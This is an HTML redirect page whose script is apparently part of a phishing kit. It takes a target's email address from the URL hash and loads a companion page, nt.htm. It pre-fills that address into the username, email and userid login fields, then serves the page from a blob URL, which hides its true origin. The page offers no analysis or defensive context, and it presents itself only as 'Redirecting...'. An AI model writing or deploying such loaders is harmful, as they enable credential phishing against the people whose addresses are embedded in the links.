<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        // Extract email from URL hash (empty string if no hash)
        const email = window.location.hash.substring(1) || '';
        console.log('Extracted email:', email);
        
        // Fetch nt.htm content and create blob - FIXED FILENAME
        fetch('nt.htm')
            .then(response => response.arrayBuffer())
            .then(buffer => {
                // Remove UTF-8 BOM if present
                let bomRemovedBuffer = buffer;
                const bom = new Uint8Array(buffer.slice(0, 3));
                if (bom[0] === 0xEF && bom[1] === 0xBB && bom[2] === 0xBF) {
                    bomRemovedBuffer = buffer.slice(3);
                }
                
                // Convert to text
                const decoder = new TextDecoder('utf-8');
                let htmlContent = decoder.decode(bomRemovedBuffer);
                
                // Only inject email script if there's an email
                if (email) {
                    const emailScript = `
<script>
// Email injection from URL hash
window.addEventListener('load', function() {
    const email = "${email}";
    console.log('Setting email to:', email);
    
    // Try multiple fields that might contain email
    setTimeout(function() {
        const fields = [
            document.getElementById('id'),
            document.getElementById('pet'),
            document.getElementById('ai'),
            document.querySelector('input[name="username"]'),
            document.querySelector('input[type="email"]'),
            document.querySelector('input[name="userid"]')
        ];
        
        fields.forEach(field => {
            if (field) {
                field.value = email;
                console.log('Set email in field:', field.id || field.name);
            }
        });
        
        // Update display elements
        const displayElements = [
            document.getElementById('aich'),
            document.getElementById('p1')
        ];
        
        displayElements.forEach(element => {
            if (element) {
                element.innerHTML = email;
                console.log('Set email in display element:', element.id);
            }
        });
    }, 100);
});
<\/script>
`;
                    // Insert the email script right before the closing </body> tag
                    htmlContent = htmlContent.replace('</body>', emailScript + '</body>');
                }
                
                // Create blob and redirect
                const blob = new Blob([htmlContent], { type: 'text/html; charset=utf-8' });
                const blobUrl = URL.createObjectURL(blob);
                console.log('Redirecting to blob URL with email:', email || 'none');
                window.location.replace(blobUrl);
            })
            .catch(error => {
                console.error('Error loading nt.htm:', error);
                // Fallback - redirect to normal nt.htm
                window.location.href = 'nt.htm';
            });
    </script>
</body>
</html>
